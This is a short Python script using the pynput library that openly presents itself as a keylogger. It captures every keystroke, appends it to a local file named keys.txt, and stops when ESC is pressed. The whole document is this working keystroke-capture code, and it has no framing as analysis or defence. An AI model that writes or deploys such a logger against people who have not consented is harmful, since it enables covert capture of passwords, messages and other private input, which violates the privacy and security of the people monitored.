from pynput import keyboard

def on_press(key):
    with open("keys.txt", "a") as f:
        try:
            f.write(key.char)
        except:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nLogging stopped")
        return False

print("Keylogger started... Press ESC to stop")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()